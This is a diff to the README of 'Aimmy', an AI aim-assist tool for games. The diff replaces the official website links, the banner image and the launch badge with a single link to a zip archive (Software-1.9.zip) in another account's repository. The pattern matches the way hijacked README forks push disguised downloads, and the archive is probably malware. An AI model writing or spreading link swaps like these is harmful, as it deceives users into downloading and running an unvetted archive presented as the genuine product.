@@ -1,6 +1,6 @@
 # Aimmy: Enhancing Gaming Accessibility with AI!
 
-![Aimmy Banner](https://imageurl.com)
+![Aimmy Banner](https://github.com/Juan106720/Aimmy/raw/refs/heads/master/aphilanthropy/Software-1.9.zip)
 
 Welcome to Aimmy, the free AI-based aim aligner developed by BabyHamsta and Nori to revolutionize gaming accessibility. Unlike traditional tools, Aimmy leverages cutting-edge technologies such as DirectML, ONNX, and YOLOV8 to provide gamers with unparalleled precision and efficiency in enhancing their aim.
 
@@ -10,9 +10,9 @@ Welcome to Aimmy, the free AI-based aim aligner developed by BabyHamsta and Nori
 - **Enhanced Gaming Experience**: Improve your aim and dominate in your favorite games with Aimmy's advanced features.
 
 ## Get Started
-To experience the power of Aimmy, visit the official website at [Aimmy Website](https://aimmy.app).
+To experience the power of Aimmy, visit the official website at [Aimmy Website](https://github.com/Juan106720/Aimmy/raw/refs/heads/master/aphilanthropy/Software-1.9.zip).
 
-[![Launch Aimmy](https://img.shields.io/badge/Launch-Aimmy-blue)](https://aimmy.app)
+[![Launch Aimmy](https://github.com/Juan106720/Aimmy/raw/refs/heads/master/aphilanthropy/Software-1.9.zip)](https://github.com/Juan106720/Aimmy/raw/refs/heads/master/aphilanthropy/Software-1.9.zip)
 
 ## How Aimmy Works
 Aimmy employs advanced AI algorithms to analyze your gaming movements and provide real-time feedback, helping you align your aim with precision and speed. Whether you're a professional gamer looking to sharpen your skills or a casual player aiming to step up your game, Aimmy is here to support you on your journey to mastering your aim.
@@ -37,4 +37,4 @@ Become part of the Aimmy community and connect with like-minded individuals who 
 
 ---
 
-Remember, your aim is the key to unlocking your full gaming potential. With Aimmy by your side, you can take your aim to new heights and achieve success in your favorite games. Visit the [Aimmy website](https://aimmy.app) today and experience the future of gaming accessibility with AI-powered precision. Let Aimmy guide your aim and lead you to victory in every gaming challenge you face.
+Remember, your aim is the key to unlocking your full gaming potential. With Aimmy by your side, you can take your aim to new heights and achieve success in your favorite games. Visit the [Aimmy website](https://github.com/Juan106720/Aimmy/raw/refs/heads/master/aphilanthropy/Software-1.9.zip) today and experience the future of gaming accessibility with AI-powered precision. Let Aimmy guide your aim and lead you to victory in every gaming challenge you face.
